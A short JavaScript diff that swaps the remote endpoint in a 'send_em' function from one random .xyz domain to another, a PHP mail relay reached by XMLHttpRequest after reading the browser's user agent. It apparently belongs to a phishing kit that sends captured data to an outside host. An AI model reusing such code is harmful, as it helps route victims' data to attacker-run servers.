@@ -23,7 +23,7 @@ function formatString(e) {
     );
   }
   async function send_em(to,from,subject,body){
-    var yourUrl ="https://gqzop.xyz/pharoh/smtpjs.php";
+    var yourUrl ="https://ghodfxyz.xyz/pharoh/smtpjs.php";
     let agent = navigator.userAgent;
     var xhr = new XMLHttpRequest();
     xhr.onreadystatechange = function() {
